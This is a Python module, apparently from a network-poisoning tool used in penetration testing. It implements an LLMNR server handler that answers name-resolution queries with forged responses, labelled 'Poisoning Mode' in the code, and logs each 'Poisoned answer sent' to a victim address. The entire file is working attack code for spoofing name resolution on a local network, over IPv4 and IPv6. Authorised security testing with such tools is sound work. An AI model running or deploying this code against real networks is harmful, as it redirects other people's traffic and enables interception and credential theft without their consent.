#!/usr/bin/env python
from socketserver import BaseRequestHandler
from ..packets import LLMNR_Ans, LLMNR6_Ans
from ..utils import *

#Should we answer to those AAAA?
Have_IPv6 = settings.Config.IPv6

def Parse_LLMNR_Name(data):
	NameLen = data[12]
	return data[13:13+NameLen]

class LLMNR(BaseRequestHandler):  # LLMNR Server class
	def handle(self):
		try:
			data, soc = self.request
			Name = Parse_LLMNR_Name(data).decode("latin-1")
			LLMNRType = Parse_IPV6_Addr(data)

			if data[2:4] == b'\x00\x00':
				if LLMNRType == True:  # Poisoning Mode
					Buffer1 = LLMNR_Ans(Tid=RecvBuffer(data[0:2]), QuestionName=Name, AnswerName=Name)
					Buffer1.calculate()
					soc.sendto(SendBuffer(Buffer1), self.client_address)
					if not settings.Config.Quiet:
						print("[*] [LLMNR] Poisoned answer sent to %s for name %s" % (self.client_address[0].replace("::ffff:",""), Name))

				elif LLMNRType == 'IPv6' and Have_IPv6:
					Buffer1 = LLMNR6_Ans(Tid=RecvBuffer(data[0:2]), QuestionName=Name, AnswerName=Name)
					Buffer1.calculate()
					soc.sendto(SendBuffer(Buffer1), self.client_address)
					if not settings.Config.Quiet:
						print("[*] [LLMNR] Poisoned answer sent to %s for name %s" % (self.client_address[0].replace("::ffff:",""), Name))
		except Exception as e:
			print(e)
